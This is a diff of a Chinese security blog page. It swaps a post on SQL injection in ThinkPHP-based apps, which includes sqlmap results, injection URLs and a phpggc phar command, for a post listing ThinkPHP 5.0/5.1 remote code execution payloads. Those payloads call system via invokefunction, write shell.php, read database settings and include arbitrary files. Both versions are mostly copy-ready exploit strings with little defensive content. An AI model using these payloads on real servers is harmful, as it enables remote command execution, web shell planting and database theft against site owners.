@@ -14,15 +14,15 @@
   <meta name="theme-color">
 
   
-  <title>MVC-PHP代码审计4-框架-SQL注入 &middot; IIIIIII的博客</title>
-    <meta name="title" content="MVC-PHP代码审计4-框架-SQL注入 &middot; IIIIIII的博客">
+  <title>PHP10-thinkphp-RCE &middot; IIIIIII的博客</title>
+    <meta name="title" content="PHP10-thinkphp-RCE &middot; IIIIIII的博客">
 
   
   
   <meta name="keywords" content="php,">
   
   
-  <link rel="canonical" href="https://Starrui777.github.io/posts/code6phpmvc/">
+  <link rel="canonical" href="https://Starrui777.github.io/posts/code12phpmvc/">
   
   
   
@@ -95,45 +95,45 @@
   
 
   
-  <meta property="og:url" content="https://Starrui777.github.io/posts/code6phpmvc/">
+  <meta property="og:url" content="https://Starrui777.github.io/posts/code12phpmvc/">
   <meta property="og:site_name" content="IIIIIII的博客">
-  <meta property="og:title" content="MVC-PHP代码审计4-框架-SQL注入">
+  <meta property="og:title" content="PHP10-thinkphp-RCE">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-10-01T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-10-01T00:00:00+00:00">
+    <meta property="article:published_time" content="2025-10-18T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-10-18T00:00:00+00:00">
     <meta property="article:tag" content="Php">
 
   
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="MVC-PHP代码审计4-框架-SQL注入">
+  <meta name="twitter:title" content="PHP10-thinkphp-RCE">
 
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "MVC-PHP代码审计4-框架-SQL注入",
-    "headline": "MVC-PHP代码审计4-框架-SQL注入",
+    "name": "PHP10-thinkphp-RCE",
+    "headline": "PHP10-thinkphp-RCE",
     
     
     "inLanguage": "en",
-    "url" : "https:\/\/Starrui777.github.io\/posts\/code6phpmvc\/",
+    "url" : "https:\/\/Starrui777.github.io\/posts\/code12phpmvc\/",
     "author" : {
       "@type": "Person",
       "name": "IIIIIIIIIIII"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-10-01T00:00:00\u002b00:00",
-    "datePublished": "2025-10-01T00:00:00\u002b00:00",
+    "dateCreated": "2025-10-18T00:00:00\u002b00:00",
+    "datePublished": "2025-10-18T00:00:00\u002b00:00",
     
-    "dateModified": "2025-10-01T00:00:00\u002b00:00",
+    "dateModified": "2025-10-18T00:00:00\u002b00:00",
     
     "keywords": ["php"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "309"
+    "wordCount": "112"
   }]
   </script>
 
@@ -509,7 +509,7 @@
     <header id="single_header" class="mt-5 max-w-prose">
       
       <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-        MVC-PHP代码审计4-框架-SQL注入
+        PHP10-thinkphp-RCE
       </h1>
       <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
         
@@ -562,7 +562,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-10-01T00:00:00&#43;00:00">1 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>309 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
+      <time datetime="2025-10-18T00:00:00&#43;00:00">18 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>112 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
     
 
     
@@ -740,14 +740,9 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#mvc-php代码审计4-框架-sql注入">MVC-PHP代码审计4-框架-SQL注入</a>
+    <li><a href="#php代码审计10-thinkphp-rce">PHP代码审计10-thinkphp-RCE</a>
       <ul>
-        <li><a href="#案例一schoolcms-sql注入-版本漏洞">案例一schoolcms-sql注入-版本漏洞</a></li>
-        <li><a href="#案例二-weipan-后台不安全的sql语法写法">案例二-weipan-后台不安全的sql语法写法</a>
-          <ul>
-            <li><a href="#thinkphp-mysql爆破导致密码泄露-5024">THINKPHP-mysql爆破导致密码泄露-5.0.24</a></li>
-          </ul>
-        </li>
+        <li><a href="#案例一rce50-51-工具秒杀">案例一：RCE5.0-5.1 工具秒杀</a></li>
       </ul>
     </li>
   </ul>
@@ -763,14 +758,9 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#mvc-php代码审计4-框架-sql注入">MVC-PHP代码审计4-框架-SQL注入</a>
+    <li><a href="#php代码审计10-thinkphp-rce">PHP代码审计10-thinkphp-RCE</a>
       <ul>
-        <li><a href="#案例一schoolcms-sql注入-版本漏洞">案例一schoolcms-sql注入-版本漏洞</a></li>
-        <li><a href="#案例二-weipan-后台不安全的sql语法写法">案例二-weipan-后台不安全的sql语法写法</a>
-          <ul>
-            <li><a href="#thinkphp-mysql爆破导致密码泄露-5024">THINKPHP-mysql爆破导致密码泄露-5.0.24</a></li>
-          </ul>
-        </li>
+        <li><a href="#案例一rce50-51-工具秒杀">案例一：RCE5.0-5.1 工具秒杀</a></li>
       </ul>
     </li>
   </ul>
@@ -792,67 +782,29 @@
 
         <div class="article-content max-w-prose mb-20">
           
-<h2 class="relative group">MVC-PHP代码审计4-框架-SQL注入 
-    <div id="mvc-php代码审计4-框架-sql注入" class="anchor"></div>
+<h2 class="relative group">PHP代码审计10-thinkphp-RCE 
+    <div id="php代码审计10-thinkphp-rce" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#mvc-php%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a14-%e6%a1%86%e6%9e%b6-sql%e6%b3%a8%e5%85%a5" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#php%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a110-thinkphp-rce" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
 <!-- more --> 
-<pre tabindex="0"><code>判断是否是框架：
-	搜索version  THINK_VERSION
-	判断语法
-	看文件名
+<pre tabindex="0"><code> **5.0.7&lt;=ThinkPHP5&lt;=5.0.22** 、**5.1.0&lt;=ThinkPHP&lt;=5.1.30**
 </code></pre>
-<h3 class="relative group">案例一schoolcms-sql注入-版本漏洞 
-    <div id="案例一schoolcms-sql注入-版本漏洞" class="anchor"></div>
+<h3 class="relative group">案例一：RCE5.0-5.1 工具秒杀 
+    <div id="案例一rce50-51-工具秒杀" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%a1%88%e4%be%8b%e4%b8%80schoolcms-sql%e6%b3%a8%e5%85%a5-%e7%89%88%e6%9c%ac%e6%bc%8f%e6%b4%9e" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%a1%88%e4%be%8b%e4%b8%80rce50-51-%e5%b7%a5%e5%85%b7%e7%a7%92%e6%9d%80" aria-label="Anchor">#</a>
     </span>        
     
 </h3>
-<p>新建需要自己看情况自己新建要写入的目录我这里是/Runtime/Cache 创建了就进去了</p>
-<p>admin schoolcms 默认密码</p>
-<p>点击右边文章发现了</p>
-<p>http://localhost:910/index.php?m=Home&amp;c=Article&amp;a=Index&amp;id=6</p>
-<pre tabindex="0"><code>public function Index()
-	{
-		$m = M(&#39;Article&#39;);
-		$article = $m-&gt;where(array(&#39;id&#39;=&gt;I(&#39;id&#39;), &#39;is_enable&#39;=&gt;1))-&gt;find();
-		if(!empty($article[&#39;content&#39;]))
-		{
-			// 访问统计
-			$m-&gt;where(array(&#39;id&#39;=&gt;I(&#39;id&#39;)))-&gt;setInc(&#39;access_count&#39;);
-M表示表名字
-用了默认的find()方法
-</code></pre><pre tabindex="0"><code>const THINK_VERSION     =   &#39;3.2.3&#39;;  版本如下
-</code></pre><p>在这个版本find是有sql注入漏洞的</p>
-<p>id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)&ndash;&amp;id[where]=1 结果不行</p>
-<p>Application/Admin/Controller/AdminController.class.php 我们换一个文件这里的代码测试</p>
-<pre tabindex="0"><code>	public function SaveInfo()
-	{
-		// 登录校验
-		$this-&gt;Is_Login();
-
-		// 不是操作自己的情况下
-		if(I(&#39;id&#39;) != $this-&gt;admin[&#39;id&#39;])
-		{
-			// 权限校验
-			$this-&gt;Is_Power();
-		}
-
-		// 用户编辑
-		$id = I(&#39;id&#39;);
-		if($id &gt; 0)
-</code></pre><p>http://localhost:910/index.php?m=admin&amp;c=Article&amp;a=SaveInfo&amp;id=6</p>
-<p>因为是数字不用引号</p>
-<p>http://localhost:910/index.php?m=admin&amp;c=Article&amp;a=SaveInfo&amp;id[where]=6 and sleep(2)#  不用报错因为没开</p>
-<p>确实延迟了</p>
+<p><strong>5.0.7&lt;=ThinkPHP5&lt;=5.0.22</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p>
+<p>直接利用工具探测</p>
 <p>
 
 
@@ -861,113 +813,44 @@ M表示表名字
 
 
 <figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/sqlmvc/1.png">
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/rcetp/1.png">
 
   
 </figure>
 </p>
-<p>使用sqlmap跑</p>
-<pre tabindex="0"><code>GET /index.php?m=admin&amp;c=Article&amp;a=SaveInfo&amp;id[where]=1* HTTP/1.1
-Host: 192.168.1.56:910
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Cookie: think_language=en-US; PHPSESSID=36ijnbi7on3o87iu9t7nt9bd9t
-
-python sqlmap.py -r 1234.txt
-
-erun with the &#39;--tamper=between&#39;
-URI parameter &#39;#1*&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N]
-
-sqlmap identified the following injection point(s) with a total of 393 HTTP(s) requests:
----
-Parameter: #1* (URI)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: http://192.168.1.56:910/index.php?m=admin&amp;c=Article&amp;a=SaveInfo&amp;id[where]=1 AND 3941=3941
-
-    Type: stacked queries
-    Title: MySQL &gt;= 5.0.12 stacked queries (comment)
-    Payload: http://192.168.1.56:910/index.php?m=admin&amp;c=Article&amp;a=SaveInfo&amp;id[where]=1;SELECT SLEEP(5)#
-
-    Type: time-based blind
-    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: http://192.168.1.56:910/index.php?m=admin&amp;c=Article&amp;a=SaveInfo&amp;id[where]=1 AND (SELECT 2987 FROM (SELECT(SLEEP(5)))YRrr)
----
-[10:40:20] [INFO] the back-end DBMS is MySQL
-web application technology: ThinkPHP, Apache 2.4.39
-back-end DBMS: MySQL &gt;= 5.0.12
-[10:40:21] [INFO] fetched data logged to text files under &#39;C:\Users\22118\AppData\Local\sqlmap\output\192.168.1.56&#39;
-[10:40:21] [WARNING] your sqlmap version is outdated
-</code></pre>
-<h3 class="relative group">案例二-weipan-后台不安全的sql语法写法 
-    <div id="案例二-weipan-后台不安全的sql语法写法" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%a1%88%e4%be%8b%e4%ba%8c-weipan-%e5%90%8e%e5%8f%b0%e4%b8%8d%e5%ae%89%e5%85%a8%e7%9a%84sql%e8%af%ad%e6%b3%95%e5%86%99%e6%b3%95" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<p>index/controller/Goods.php</p>
-<p>http://localhost:912/index/Goods/ajaxkdata/tokenpid/1 and 1=1</p>
-<blockquote>
-<p>where(&lsquo;pid=&rsquo;.$pid</p>
-<p>(&lsquo;uid&rsquo;,$uid)-&gt;find()</p></blockquote>
-<pre tabindex="0"><code>$user = Db::name(&#39;userinfo&#39;)-&gt;where(&#39;uid&#39;,$uid)-&gt;find();  这种是预编译写法使用,来连接
-但是在他同一文件发现了.来连接这可能是一个漏洞
-
-public function ajaxkdata()
-	{
-		//获取k线图数据，转化为array
-
-		$pid = input(&#39;param.pid&#39;);
-        $data = Db::name(&#39;productdata&#39;)-&gt;where(&#39;pid=&#39;.$pid)-&gt;find();
-       	$newdata = array();
-        if($data){
-            $data[&#39;UpdateTime&#39;] = $data[&#39;UpdateTime&#39;];
-            $newdata[0][&#39;price&#39;] = $data[&#39;Price&#39;];
-            $newdata[0][&#39;open&#39;] = $data[&#39;Open&#39;];
-            $newdata[0][&#39;close&#39;] = $data[&#39;Close&#39;];
-            $newdata[0][&#39;lowest&#39;] = $data[&#39;Low&#39;];
-            $newdata[0][&#39;highest&#39;] = $data[&#39;High&#39;];
-            $newdata[0][&#39;time&#39;] = $data[&#39;UpdateTime&#39;].&#39;000&#39;;
-            $newdata[0][&#39;fulltime&#39;] = date(&#39;Y-m-d H:i:s&#39;,$data[&#39;UpdateTime&#39;]);
-            $newdata[0][&#39;goodtime&#39;] = date(&#39;Y-m-d H:i:s&#39;,$data[&#39;UpdateTime&#39;]);
-
-        }
-</code></pre><p>这里版本也有phar漏洞  他版本是5.0.24</p>
-<p>./phpggc ThinkPHP/FW1 目标目录 本地文件 -p phar -o test.phar</p>
-<p>/index/getdata/mkdirs?dir=phar://test.png</p>
-
-<h4 class="relative group">THINKPHP-mysql爆破导致密码泄露-5.0.24 
-    <div id="thinkphp-mysql爆破导致密码泄露-5024" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#thinkphp-mysql%e7%88%86%e7%a0%b4%e5%af%bc%e8%87%b4%e5%af%86%e7%a0%81%e6%b3%84%e9%9c%b2-5024" aria-label="Anchor">#</a>
-    </span>        
-    
-</h4>
-<p>在这个源码版本中当对面mysql外连 且开启报错时候可以爆破来看到密码</p>
-<p>
+<p>具体payload</p>
+<p>5.1</p>
+<pre tabindex="0"><code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd
+?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;
+?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt; 写入文件
+?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+</code></pre><p>5.0</p>
+<pre tabindex="0"><code>?s=index/think\config/get&amp;name=database.username # 获取配置信息
+?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件
+?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+</code></pre><p>call_user_func 和 call_user_func_array 一个逐个传入参数  ， 一个数组传入参数</p>
+<ul>
+<li>用 <code>call_user_func_array</code> → 要求 <code>vars[1]</code> 必须是数组（所以加 <code>[]</code> 变成二维）；</li>
+<li>用 <code>call_user_func</code> → 要求 <code>vars[1]</code> 是普通值（所以不加 <code>[]</code>，保持一维）。</li>
+</ul>
+<pre tabindex="0"><code>function add($a, $b) { return $a + $b; }  
+echo call_user_func(&#39;add&#39;, 1, 2); // 输出 3  
 
 
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/sqlmvc/2.png">
-
-  
-</figure>
-</p>
-<p>原因是thinphp里面有一个连接文件 一直连接报错会爆出异常</p>
-<p>修复关闭debug 注释掉连接文件代码</p>
-
+要求传入必须是数组
+$vars = [
+    0 =&gt; &#39;system&#39;,          // 第一个参数：要调用的函数名（system）
+    1 =&gt; [&#39;calc&#39;]           // 第二个参数：传给 system 的参数（必须是数组！）
+];
+function show($name, $age) { echo &#34;Name: $name, Age: $age&#34;; }  
+$params = [&#39;Tom&#39;, 20]; // 动态生成的参数数组  
+call_user_func_array(&#39;show&#39;, $params); // 输出 Name: Tom, Age: 20  
+</code></pre><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">?s=index/\think\Container/invokefunction&amp;function=call_user_func&amp;vars[0]=system&amp;vars[1]=calc
+</span></span><span class="line"><span class="cl">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=calc
+</span></span><span class="line"><span class="cl">不加array也可以
+</span></span></code></pre></div>
           
           
           
@@ -988,9 +871,9 @@ public function ajaxkdata()
   class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
   <a
     
-  href="/posts/code4phpmvc/"
+  href="/posts/code11phpmvc/"
     class="absolute inset-0"
-    aria-label="MVC-PHP代码审计2"></a>
+    aria-label="PHP代码审计9-框架-YII"></a>
       
     
         
@@ -1003,7 +886,7 @@ public function ajaxkdata()
     
       <div
         class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
-        MVC-PHP代码审计2
+        PHP代码审计9-框架-YII
       </div>
     
     <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
@@ -1054,7 +937,7 @@ public function ajaxkdata()
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-09-27T00:00:00&#43;00:00">27 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>204 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
+      <time datetime="2025-10-16T00:00:00&#43;00:00">16 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>263 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
     
 
     
@@ -1111,9 +994,9 @@ public function ajaxkdata()
   class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
   <a
     
-  href="/posts/code5phpmvc/"
+  href="/posts/code10phpmvc/"
     class="absolute inset-0"
-    aria-label="MVC-PHP代码审计3-反序列化-原生-框架-phar"></a>
+    aria-label="PHP代码审计8-XXE-XSS"></a>
       
     
         
@@ -1126,7 +1009,7 @@ public function ajaxkdata()
     
       <div
         class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
-        MVC-PHP代码审计3-反序列化-原生-框架-phar
+        PHP代码审计8-XXE-XSS
       </div>
     
     <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
@@ -1177,7 +1060,7 @@ public function ajaxkdata()
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-09-27T00:00:00&#43;00:00">27 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>452 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
+      <time datetime="2025-10-15T00:00:00&#43;00:00">15 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>272 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
     
 
     
@@ -1234,9 +1117,9 @@ public function ajaxkdata()
   class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
   <a
     
-  href="/posts/code3phpmvc/"
+  href="/posts/code9phpmvc/"
     class="absolute inset-0"
-    aria-label="MVC-PHP代码审计"></a>
+    aria-label="PHP代码审计7-变量覆盖"></a>
       
     
         
@@ -1249,7 +1132,7 @@ public function ajaxkdata()
     
       <div
         class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
-        MVC-PHP代码审计
+        PHP代码审计7-变量覆盖
       </div>
     
     <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
@@ -1300,7 +1183,7 @@ public function ajaxkdata()
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-09-26T00:00:00&#43;00:00">26 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>336 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
+      <time datetime="2025-10-10T00:00:00&#43;00:00">10 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>190 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
     
 
     
@@ -1357,9 +1240,9 @@ public function ajaxkdata()
   class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
   <a
     
-  href="/posts/ame/"
+  href="/posts/code8phpmvc/"
     class="absolute inset-0"
-    aria-label="Logi靶机-maze-JWT-Ti15中国队加油！"></a>
+    aria-label="MVC-PHP代码审计6-框架-文件包含"></a>
       
     
         
@@ -1372,7 +1255,7 @@ public function ajaxkdata()
     
       <div
         class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
-        Logi靶机-maze-JWT-Ti15中国队加油！
+        MVC-PHP代码审计6-框架-文件包含
       </div>
     
     <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
@@ -1423,7 +1306,7 @@ public function ajaxkdata()
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-10-01T00:00:00&#43;00:00">1 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>265 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
+      <time datetime="2025-10-09T00:00:00&#43;00:00">9 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>151 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span>
     
 
     
@@ -1447,11 +1330,11 @@ public function ajaxkdata()
         
           
             
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/jwt/"
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/php/"
                 ><span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Jwt
+    Php
   </span>
 </span>
 </a
@@ -1480,9 +1363,9 @@ public function ajaxkdata()
   class="group-hover-card group relative min-h-full min-w-full overflow-hidden rounded border border-2 border-neutral-200 shadow-2xl dark:border-neutral-700">
   <a
     
-  href="/posts/readfile/"
+  href="/posts/code7phpmvc/"
     class="absolute inset-0"
-    aria-label="readfile靶机-maze-snmp-rbash-能力机制"></a>
+    aria-label="MVC-PHP代码审计5-框架-反序列化构建链"></a>
       
     
         
@@ -1495,7 +1378,7 @@ public function ajaxkdata()
     
       <div
         class="group-hover-card-title decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 group-hover:underline group-hover:underline-offset-2">
-        readfile靶机-maze-snmp-rbash-能力机制
+        MVC-PHP代码审计5-框架-反序列化构建链
       </div>
     
     <div class="group-hover-cancel text-sm text-neutral-500 dark:text-neutral-400">
@@ -1546,7 +1429,7 @@ public function ajaxkdata()
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-09-28T00:00:00&#43;00:00">28 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>723 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span>
+      <time datetime="2025-10-06T00:00:00&#43;00:00">6 October 2025</time><span class="px-2 text-primary-500">&middot;</span><span>249 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
     
 
     
@@ -1570,21 +1453,11 @@ public function ajaxkdata()
         
           
             
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/rbash/"
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/php/"
                 ><span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Rbash
-  </span>
-</span>
-</a
-              >
-            
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/smtp/"
-                ><span class="flex cursor-pointer">
-  <span
-    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Smtp
+    Php
   </span>
 </span>
 </a
@@ -1627,8 +1500,8 @@ public function ajaxkdata()
           type="text/javascript"
           src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
           integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
-          data-oid="views_posts\code6phpmvc.md"
-          data-oid-likes="likes_posts\code6phpmvc.md"></script>
+          data-oid="views_posts\code12phpmvc.md"
+          data-oid-likes="likes_posts\code12phpmvc.md"></script>
       
     </section>
 
@@ -1644,7 +1517,7 @@ public function ajaxkdata()
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/posts/readfile/">
+            <a class="flex group mr-3" href="/posts/code11phpmvc/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -1655,11 +1528,11 @@ public function ajaxkdata()
               >
               <span class="flex flex-col">
                 <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >readfile靶机-maze-snmp-rbash-能力机制</span
+                  >PHP代码审计9-框架-YII</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-09-28T00:00:00&#43;00:00">28 September 2025</time>
+                    <time datetime="2025-10-16T00:00:00&#43;00:00">16 October 2025</time>
                   
                 </span>
               </span>
@@ -1668,14 +1541,14 @@ public function ajaxkdata()
         </span>
         <span>
           
-            <a class="flex text-right group ml-3" href="/posts/ame/">
+            <a class="flex text-right group ml-3" href="/posts/code13phpmvc/">
               <span class="flex flex-col">
                 <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Logi靶机-maze-JWT-Ti15中国队加油！</span
+                  >PHP11-Laravel-代码审计</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-10-01T00:00:00&#43;00:00">1 October 2025</time>
+                    <time datetime="2025-10-19T00:00:00&#43;00:00">19 October 2025</time>
                   
                 </span>
               </span>
